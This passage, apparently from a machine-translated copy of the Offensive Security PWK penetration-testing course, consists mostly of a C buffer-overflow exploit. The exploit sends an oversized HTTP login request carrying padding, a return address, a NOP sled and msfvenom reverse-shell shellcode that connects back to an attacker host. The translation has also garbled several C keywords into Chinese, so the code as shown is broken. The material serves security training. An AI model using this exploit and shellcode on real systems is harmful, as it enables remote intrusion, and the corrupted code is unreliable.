<div style="position:absolute;top:23352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c文件的最终大小：1500字节</font></font></nobr></div>
<div style="position:absolute;top:23369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无符号字符 buf[] = </font></font></nobr></div>
<div style="position:absolute;top:23386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbf\x27\xf0\xd2\x43\xda\xd5\xd9\x74\x24\xf4\x58\x31\xc9\xb1"</font></font></nobr></div>
<div style="position:absolute;top:23403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x52\x31\x78\x12\x03\x78\x12\x83\xcf\x0c\x30\xb6\xf3\x05\x37"</font></font></nobr></div>
<div style="position:absolute;top:23420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x39\x0b\xd6\x58\xb3\xee\xe7\x58\xa7\x7b\x57\x69\xa3\x29\x54"</font></font></nobr></div>
<div style="position:absolute;top:23437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x02\xe1\xd9\xef\x66\x2e\xee\x58\xcc\x08\xc1\x59\x7d\x68\x40"</font></font></nobr></div>
<div style="position:absolute;top:23454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xda\x7c\xbd\xa2\xe3\x4e\xb0\xa3\x24\xb2\x39\xf1\xfd\xb8\xec"</font></font></nobr></div>
<div style="position:absolute;top:23471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xe5\x8a\xf5\x2c\x8e\xc1\x18\x35\x73\x91\x1b\x14\x22\xa9\x45"</font></font></nobr></div>
<div style="position:absolute;top:23488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xb6\xc5\x7e\xfe\xff\xdd\x63\x3b\x49\x56\x57\xb7\x48\xbe\xa9"</font></font></nobr></div>
<div style="position:absolute;top:23505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x38\xe6\xff\x05\xcb\xf6\x38\xa1\x34\x8d\x30\xd1\xc9\x96\x87"</font></font></nobr></div>
<div style="position:absolute;top:23522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xab\x15\x12\x13\x0b\xdd\x84\xff\xad\x32\x52\x74\xa1\xff\x10"</font></font></nobr></div>
<div style="position:absolute;top:23539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xd2\xa6\xfe\xf5\x69\xd2\x8b\xfb\xbd\x52\xcf\xdf\x19\x3e\x8b"</font></font></nobr></div>
<div style="position:absolute;top:23556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x7e\x38\x9a\x7a\x7e\x5a\x45\x22\xda\x11\x68\x37\x57\x78\xe5"</font></font></nobr></div>
<div style="position:absolute;top:23572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf4\x5a\x82\xf5\x92\xed\xf1\xc7\x3d\x46\x9d\x6b\xb5\x40\x5a"</font></font></nobr></div>
<div style="position:absolute;top:23589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8b\xec\x35\xf4\x72\x0f\x46\xdd\xb0\x5b\x16\x75\x10\xe4\xfd"</font></font></nobr></div>
<div style="position:absolute;top:23606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x85\x9d\x31\x51\xd5\x31\xea\x12\x85\xf1\x5a\xfb\xcf\xfd\x85"</font></font></nobr></div>
<div style="position:absolute;top:23623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x1b\xf0\xd7\xad\xb6\x0b\xb0\xdb\x4d\x13\x52\xb4\x53\x13\x53"</font></font></nobr></div>
<div style="position:absolute;top:23641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xff\xdd\xf5\x39\xef\x8b\xae\xd5\x96\x91\x24\x47\x56\x0c\x41"</font></font></nobr></div>
<div style="position:absolute;top:23657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x47\xdc\xa3\xb6\x06\x15\xc9\xa4\xff\xd5\x84\x96\x56\xe9\x32"</font></font></nobr></div>
<div style="position:absolute;top:23674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbe\x35\x78\xd9\x3e\x33\x61\x76\x69\x14\x57\x8f\xff\x88\xce"</font></font></nobr></div>
<div style="position:absolute;top:23691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x39\x1d\x51\x96\x02\xa5\x8e\x6b\x8c\x24\x42\xd7\xaa\x36\x9a"</font></font></nobr></div>
<div style="position:absolute;top:23708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xd8\xf6\x62\x72\x8f\xa0\xdc\x34\x79\x03\xb6\xee\xd6\xcd\x5e"</font></font></nobr></div>
<div style="position:absolute;top:23725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x76\x15\xce\x18\x77\x70\xb8\xc4\xc6\x2d\xfd\xfb\xe7\xb9\x09"</font></font></nobr></div>
<div style="position:absolute;top:23742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x84\x15\x5a\xf5\x5f\x9e\x7a\x14\x75\xeb\x12\x81\x1c\x56\x7f"</font></font></nobr></div>
<div style="position:absolute;top:23759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x32\xcb\x95\x86\xb1\xf9\x65\x7d\xa9\x88\x60\x39\x6d\x61\x19"</font></font></nobr></div>
<div style="position:absolute;top:23776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x52\x18\x85\x8e\x53\x09";</font></font></nobr></div>
<div style="position:absolute;top:23795;left:199"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 436 - 使用 msfvenom 生成适合我们环境的反向 shell 负载 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:23935;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="21"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 21 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:23968;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:25045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:25045;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:25045;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">462</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过上述所有更改，我们的漏洞利用代码现在如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:24116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#define _WINSOCK_DEPRECATED_NO_WARNINGS</font></font></nobr></div>
<div style="position:absolute;top:24133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#define DEFAULT_BUFLEN 512</font></font></nobr></div>
<div style="position:absolute;top:24166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;inttypes.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:24183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;stdio.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:24200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;winsock2.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:24217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;windows.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:24251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DWORD SendRequest(char *request, int request_size) {</font></font></nobr></div>
<div style="position:absolute;top:24268;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WSADATA wsa;</font></font></nobr></div>
<div style="position:absolute;top:24285;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插座；</font></font></nobr></div>
<div style="position:absolute;top:24302;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">struct sockaddr_in 服务器；</font></font></nobr></div>
<div style="position:absolute;top:24319;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char recvbuf[DEFAULT_BUFLEN];</font></font></nobr></div>
<div style="position:absolute;top:24336;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int recvbuflen = DEFAULT_BUFLEN;</font></font></nobr></div>
<div style="position:absolute;top:24353;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部结果；</font></font></nobr></div>
<div style="position:absolute;top:24387;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printf("\n[&gt;] 初始化 Winsock...\n");</font></font></nobr></div>
<div style="position:absolute;top:24404;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 (WSAStartup(MAKEWORD(2, 2), &amp;wsa) != 0)</font></font></nobr></div>
<div style="position:absolute;top:24421;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:24438;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printf("[!] 失败。错误代码：%d", WSAGetLastError());</font></font></nobr></div>
<div style="position:absolute;top:24455;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 1；</font></font></nobr></div>
<div style="position:absolute;top:24472;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:24506;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printf("[&gt;] 已初始化。\n");</font></font></nobr></div>
<div style="position:absolute;top:24523;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)</font></font></nobr></div>
<div style="position:absolute;top:24540;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:24557;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printf("[!] 无法创建套接字：%d", WSAGetLastError());</font></font></nobr></div>
<div style="position:absolute;top:24574;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:24608;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printf("[&gt;] 套接字已创建。\n");</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:24625;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">server.sin_addr.s_addr = inet_addr("10.11.0.22");</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24642;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">server.sin_family = AF_INET;</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:24659;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">server.sin_port = htons(80);</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24692;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if (connect(s, (struct sockaddr *)&amp;server, sizeof(server)) &lt; 0)</font></font></nobr></div>
<div style="position:absolute;top:24709;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:24727;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">puts("[!] 连接错误");</font></font></nobr></div>
<div style="position:absolute;top:24744;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 1；</font></font></nobr></div>
<div style="position:absolute;top:24760;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:24777;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">puts("[&gt;] 连接");</font></font></nobr></div>
<div style="position:absolute;top:24811;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if (send(s, request, request_size, 0) &lt; 0)</font></font></nobr></div>
<div style="position:absolute;top:24828;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:24845;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">puts("[!] 发送失败");</font></font></nobr></div>
<div style="position:absolute;top:24862;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 1；</font></font></nobr></div>
<div style="position:absolute;top:24879;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:24896;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">puts("\n[&gt;] 请求已发送\n");</font></font></nobr></div>
<div style="position:absolute;top:24913;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关闭套接字；</font></font></nobr></div>
<div style="position:absolute;top:24930;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回0；</font></font></nobr></div>
<div style="position:absolute;top:24947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:24981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无效邪恶请求（）{ </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:25123;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="22"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 22 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:25156;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:26233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:26233;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:26233;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">463</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25252;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char request_one[] = "POST /login HTTP/1.1\r\n"</font></font></nobr></div>
<div style="position:absolute;top:25268;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"主机：10.11.0.22\r\n"</font></font></nobr></div>
<div style="position:absolute;top:25285;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"用户代理：Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/201</font></font></nobr></div>
<div style="position:absolute;top:25302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00101 火狐/52.0\r\n"</font></font></nobr></div>
<div style="position:absolute;top:25320;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"接受：text/html,application/xhtml+xml,application/xml;q=0.9</font></font></nobr></div>
<div style="position:absolute;top:25336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,*/*;q=0.8\r\n"</font></font></nobr></div>
<div style="position:absolute;top:25353;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"接受语言：en-US,en;q=0.5\r\n"</font></font></nobr></div>
<div style="position:absolute;top:25370;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"引用者：http://10.11.0.22/login\r\n"</font></font></nobr></div>
<div style="position:absolute;top:25387;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"连接：关闭\r\n"</font></font></nobr></div>
<div style="position:absolute;top:25404;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"内容类型：应用程序/x-www-form-urlencoded\r\n"</font></font></nobr></div>
<div style="position:absolute;top:25421;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"内容长度：";</font></font></nobr></div>
<div style="position:absolute;top:25438;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char request_two[] = "\r\n\r\n用户名=";</font></font></nobr></div>
<div style="position:absolute;top:25472;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int initial_buffer_size = 780;</font></font></nobr></div>
<div style="position:absolute;top:25489;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char *padding = malloc(initial_buffer_size);</font></font></nobr></div>
<div style="position:absolute;top:25506;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset（填充，0x41，initial_buffer_size）；</font></font></nobr></div>
<div style="position:absolute;top:25523;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset(padding + initial_buffer_size - 1, 0x00, 1);</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:25540;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无符号字符 retn[] = "\x83\x0c\x09\x10"; </font><font style="vertical-align: inherit;">// 0x10090c83</font></font></b></nobr></div>
<div style="position:absolute;top:25574;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">// root@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EX</font></font></b></nobr></div>
<div style="position:absolute;top:25591;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ITFUNC=thread -fc –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"</font></font></b></nobr></div>
<div style="position:absolute;top:25608;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无符号字符 shellcode[] =</font></font></b></nobr></div>
<div style="position:absolute;top:25625;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP 幻灯片</font></font></b></nobr></div>
<div style="position:absolute;top:25642;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbf\x27\xf0\xd2\x43\xda\xd5\xd9\x74\x24\xf4\x58\x31\xc9\xb1"</font></font></b></nobr></div>
<div style="position:absolute;top:25659;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x52\x31\x78\x12\x03\x78\x12\x83\xcf\x0c\x30\xb6\xf3\x05\x37"</font></font></b></nobr></div>
<div style="position:absolute;top:25676;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x39\x0b\xd6\x58\xb3\xee\xe7\x58\xa7\x7b\x57\x69\xa3\x29\x54"</font></font></b></nobr></div>
<div style="position:absolute;top:25693;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x02\xe1\xd9\xef\x66\x2e\xee\x58\xcc\x08\xc1\x59\x7d\x68\x40"</font></font></b></nobr></div>
<div style="position:absolute;top:25710;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xda\x7c\xbd\xa2\xe3\x4e\xb0\xa3\x24\xb2\x39\xf1\xfd\xb8\xec"</font></font></b></nobr></div>
<div style="position:absolute;top:25727;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xe5\x8a\xf5\x2c\x8e\xc1\x18\x35\x73\x91\x1b\x14\x22\xa9\x45"</font></font></b></nobr></div>
<div style="position:absolute;top:25744;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xb6\xc5\x7e\xfe\xff\xdd\x63\x3b\x49\x56\x57\xb7\x48\xbe\xa9"</font></font></b></nobr></div>
<div style="position:absolute;top:25761;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x38\xe6\xff\x05\xcb\xf6\x38\xa1\x34\x8d\x30\xd1\xc9\x96\x87"</font></font></b></nobr></div>
<div style="position:absolute;top:25777;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xab\x15\x12\x13\x0b\xdd\x84\xff\xad\x32\x52\x74\xa1\xff\x10"</font></font></b></nobr></div>
<div style="position:absolute;top:25794;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xd2\xa6\xfe\xf5\x69\xd2\x8b\xfb\xbd\x52\xcf\xdf\x19\x3e\x8b"</font></font></b></nobr></div>
<div style="position:absolute;top:25812;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x7e\x38\x9a\x7a\x7e\x5a\x45\x22\xda\x11\x68\x37\x57\x78\xe5"</font></font></b></nobr></div>
<div style="position:absolute;top:25829;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf4\x5a\x82\xf5\x92\xed\xf1\xc7\x3d\x46\x9d\x6b\xb5\x40\x5a"</font></font></b></nobr></div>
<div style="position:absolute;top:25846;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8b\xec\x35\xf4\x72\x0f\x46\xdd\xb0\x5b\x16\x75\x10\xe4\xfd"</font></font></b></nobr></div>
<div style="position:absolute;top:25862;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x85\x9d\x31\x51\xd5\x31\xea\x12\x85\xf1\x5a\xfb\xcf\xfd\x85"</font></font></b></nobr></div>
<div style="position:absolute;top:25879;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x1b\xf0\xd7\xad\xb6\x0b\xb0\xdb\x4d\x13\x52\xb4\x53\x13\x53"</font></font></b></nobr></div>
<div style="position:absolute;top:25896;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xff\xdd\xf5\x39\xef\x8b\xae\xd5\x96\x91\x24\x47\x56\x0c\x41"</font></font></b></nobr></div>
<div style="position:absolute;top:25913;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x47\xdc\xa3\xb6\x06\x15\xc9\xa4\xff\xd5\x84\x96\x56\xe9\x32"</font></font></b></nobr></div>
<div style="position:absolute;top:25930;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbe\x35\x78\xd9\x3e\x33\x61\x76\x69\x14\x57\x8f\xff\x88\xce"</font></font></b></nobr></div>
<div style="position:absolute;top:25947;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x39\x1d\x51\x96\x02\xa5\x8e\x6b\x8c\x24\x42\xd7\xaa\x36\x9a"</font></font></b></nobr></div>
<div style="position:absolute;top:25964;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xd8\xf6\x62\x72\x8f\xa0\xdc\x34\x79\x03\xb6\xee\xd6\xcd\x5e"</font></font></b></nobr></div>
<div style="position:absolute;top:25981;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x76\x15\xce\x18\x77\x70\xb8\xc4\xc6\x2d\xfd\xfb\xe7\xb9\x09"</font></font></b></nobr></div>
<div style="position:absolute;top:25998;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x84\x15\x5a\xf5\x5f\x9e\x7a\x14\x75\xeb\x12\x81\x1c\x56\x7f"</font></font></b></nobr></div>
<div style="position:absolute;top:26015;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x32\xcb\x95\x86\xb1\xf9\x65\x7d\xa9\x88\x60\x39\x6d\x61\x19"</font></font></b></nobr></div>
<div style="position:absolute;top:26032;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x52\x18\x85\x8e\x53\x09";</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26066;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char request_three[] = "&amp;password=A";</font></font></nobr></div>
<div style="position:absolute;top:26100;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strl</font></font></nobr></div>
<div style="position:absolute;top:26117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">en(request_three);</font></font></nobr></div>
<div style="position:absolute;top:26134;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char *content_length_string = malloc(15);</font></font></nobr></div>
<div style="position:absolute;top:26151;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sprintf(content_length_string, "%d", content_length);</font></font></nobr></div>
<div style="position:absolute;top:26168;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_</font></font></nobr></div>
<div style="position:absolute;top:26185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:26311;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="23"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 23 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:26344;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:27421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:27421;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:27421;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">三）;</font></font></nobr></div>
<div style="position:absolute;top:26473;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char *buffer = malloc(buffer_length);</font></font></nobr></div>
<div style="position:absolute;top:26490;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存集（缓冲区，0x00，缓冲区长度）；</font></font></nobr></div>
<div style="position:absolute;top:26508;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy（缓冲区，request_one）；</font></font></nobr></div>
<div style="position:absolute;top:26524;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，content_length_string）；</font></font></nobr></div>
<div style="position:absolute;top:26541;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，request_two）；</font></font></nobr></div>
<div style="position:absolute;top:26558;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，填充）；</font></font></nobr></div>
<div style="position:absolute;top:26575;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，retn）；</font></font></nobr></div>
<div style="position:absolute;top:26592;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，shellcode）；</font></font></nobr></div>
<div style="position:absolute;top:26609;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，request_three）；</font></font></nobr></div>
<div style="position:absolute;top:26643;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SendRequest(buffer, strlen(buffer));</font></font></nobr></div>
